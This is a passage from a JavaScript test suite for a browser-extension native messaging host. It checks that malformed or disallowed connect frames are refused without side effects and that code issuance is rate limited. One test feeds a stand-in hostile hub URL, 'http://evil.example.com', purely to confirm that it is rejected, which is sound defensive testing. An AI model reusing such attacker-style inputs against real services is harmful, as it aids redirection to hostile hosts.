		send: (message) => proc.stdin.write(frame(message)),
		sendRaw: (bytes) => proc.stdin.write(bytes),
		async reply(id, timeoutMs = 8000) {
			const match = () => frames.find((f) => f.type === "connect" && f.id === id && (f.result !== undefined || f.error));
			if (match()) return match();
			return await new Promise((resolve, reject) => {
				const t = setTimeout(() => reject(new Error(`no reply for ${id}; got ${JSON.stringify(frames)}; stderr ${stderr}`)), timeoutMs);
				const check = () => {
					const f = match();
					if (!f) return;
					clearTimeout(t);
					waiting.splice(waiting.indexOf(check), 1);
					resolve(f);
				};
				waiting.push(check);
			});
		},
	};
}

test("the native host answers connect frames strictly and keeps stdout to frames only", async () => {
	const host = startHost("host-process");
	host.send({ type: "connect", id: 1, method: "status" });
	const status = await host.reply(1);
	assert.deepEqual(status.result, { route: "none", passcodeSet: false, theme: { preset: "tabkyra" } });

	// A call the panel may not make, an extra field, and a bad address: each answered, none run.
	host.send({ type: "connect", id: 2, method: "link.off" });
	assert.equal((await host.reply(2)).error.code, "bad_params");
	host.send({ type: "connect", id: 3, method: "status", extra: true });
	assert.equal((await host.reply(3)).error.code, "bad_params");
	host.send({ type: "connect", id: 4, method: "joinHub", params: { hubUrl: "http://evil.example.com", code: "TK-ABCD-EFGH" } });
	const joined = await host.reply(4);
	assert.equal(joined.error.code, "bad_params");
	assert.match(joined.error.message, /https/);
	host.send({ type: "connect", id: 5, method: "joinHub", params: { hubUrl: "https://hub.example.com", code: "nope" } });
	assert.match((await host.reply(5)).error.message, /TK-XXXX-XXXX/);
	host.send({ type: "connect", id: 6, method: "approvalCode" });
	assert.equal((await host.reply(6)).error.code, "unavailable");
	// A frame with no usable id gets no answer, and the host carries on.
	host.send({ type: "connect", method: "status" });
	host.send({ type: "connect", id: "7", method: "status" });
	host.send({ type: "connect", id: 8, method: "setTheme", params: { preset: "midnight", accent: "#3b3fb5" } });
	assert.deepEqual((await host.reply(8)).result, { preset: "midnight", accent: "#3b3fb5" });
	assert.equal(host.frames.filter((f) => f.type === "connect" && (f.id === undefined || f.id === "7")).length, 0);
	assert.equal(host.garbage(), false, "stdout carried something that isn't a frame");
	// None of those wrote a link, a code or a service.
	for (const f of ["link.json", "oauth-codes.json", "hub-codes.json"]) assert.equal(existsSync(join(host.m.config, f)), false, `${f} exists`);
	assert.equal(JSON.parse(readFileSync(join(host.m.config, "theme.json"), "utf8")).preset, "midnight");
	assert.match(host.stderr(), /refused a connect frame/);
	assert.doesNotMatch(host.stderr(), /evil\.example|TK-ABCD/, "the log named a parameter");
	host.proc.stdin.end();
});

test("the native host limits codes to 10 per 10 minutes", async () => {
	const host = startHost("host-limit");
	mkdirSync(host.m.config, { recursive: true, mode: 0o700 });
	writeJson(join(host.m.config, "hub.json"), { publicUrl: "https://hub.example.com", port: 8787 });
	for (let id = 1; id <= 10; id++) {
		host.send({ type: "connect", id, method: id % 2 ? "approvalCode" : "deviceCode" });
		const r = await host.reply(id);
		assert.match(r.result.code, CODE, JSON.stringify(r));
	}
	host.send({ type: "connect", id: 11, method: "approvalCode" });
	assert.equal((await host.reply(11)).error.code, "rate_limited");
	host.proc.stdin.end();
});
